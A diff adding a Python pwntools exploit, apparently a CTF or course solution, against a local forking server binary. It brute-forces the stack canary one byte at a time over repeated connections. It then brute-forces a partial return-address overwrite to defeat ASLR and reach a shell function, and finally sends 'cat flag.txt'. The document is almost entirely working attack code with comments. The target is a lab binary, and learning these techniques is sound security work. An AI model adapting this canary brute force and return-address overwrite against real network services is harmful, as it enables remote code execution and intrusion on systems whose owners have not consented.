@@ -1,0 +1,102 @@
+#!/usr/bin/env python3
+
+from time import sleep
+from pwn import *
+
+context.log_level = "error"
+
+# helper functions
+
+
+def start_server():
+    # you might want to remove the DEVNULL lines, no we don't wanna do that :P
+    # during the development of the exploit to see
+    # errors -> in the final solution we just want to see the flag :)
+    return subprocess.Popen(
+        ["./forkingserver"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
+    )
+
+
+def get_connection():
+    return remote("localhost", 6666)
+
+
+def int_to_byte(i):
+    return bytes([i])
+
+
+# you can add your functions here
+# Brute forces the canary byte by byte
+def bruteForceCanary():
+    canary = b''
+    filler = cyclic(72)
+
+    # 8 Bytes with each having 256 possible combinations (8 * 256 = 2048 Combinations)
+    # Even less, because most of the times the first byte (least sig.) ist \x00 (because of canary type in Linux)
+    for i in range(8):
+        for j in range(256):
+            io = get_connection()
+            io.recvline()
+            # Make a (real) copy of the canary and add one byte to it 
+            returnValueCopy = bytes(canary)
+            returnValueCopy += p8(j)
+
+            # Send our payload to the server and look how it responds
+            io.send(filler + returnValueCopy)
+            io.recvline()
+            answer = io.recvline().decode('utf-8')
+            # When the byte is correct we will not get an answer with "stack smashing detected"
+            # So we know that our guessed byte was right and can go to the next byte
+            if "Disconnected" in answer:
+                canary += p8(j)
+                break
+            io.close()
+
+    return canary
+
+
+def main():
+    # the forkingserver that accepts connections
+    server = start_server()
+
+    # add your exploit code here
+
+    # Fill Buffer with useless Code and bruteforce canary
+    filler = cyclic(72)
+    canary = bruteForceCanary()
+
+    # All possible combinations for ASLR (we know 0x440 from readelf -s forkingserver; and 16 Combs, from 0-F)
+    # and that the saved rip is from main (which is in the same memory area)
+    # Also the Bytes are converted to little Endian because we will send it as a payload
+    # We need to find the correct Z for \x40\xZ4 
+    # I think this could be done a little bit cleaner, but nah python is not my strength ;D
+    possibleBytes = [b'\x40\x04', b'\x40\x14', b'\x40\x24', b'\x40\x34', 
+                     b'\x40\x44', b'\x40\x54', b'\x40\x64', b'\x40\x74', 
+                     b'\x40\x84', b'\x40\x94', b'\x40\xA4', b'\x40\xB4', 
+                     b'\x40\xC4', b'\x40\xD4', b'\x40\xE4', b'\x40\xF4']
+
+    # Just test every combination
+    for bytecomb in possibleBytes:
+        io = get_connection()
+        io.recvline()
+        # 72 Bytes to fill the Buffer, then 8 Bytes for the forced canary
+        # then 8 bytes trash for a local variable and then 3 Bytes for the changed return addr
+        io.send(cyclic(72) + canary + cyclic(8) + bytecomb)
+        io.recvline()
+        # We just try to send it a console command and receive an answer
+        # If we get one back we know that our combination started the givemeshellpls Console
+        io.sendline(b"cat flag.txt")
+        try: 
+            sol = io.recvline()
+        except:
+            pass
+        io.close()
+    
+    # Convert the String
+    # One solution of the loop before will always be true, so sol will not be empty
+    print(sol.decode('utf-8')[:-1])
+    server.terminate()
+
+
+if __name__ == "__main__":
+    main()
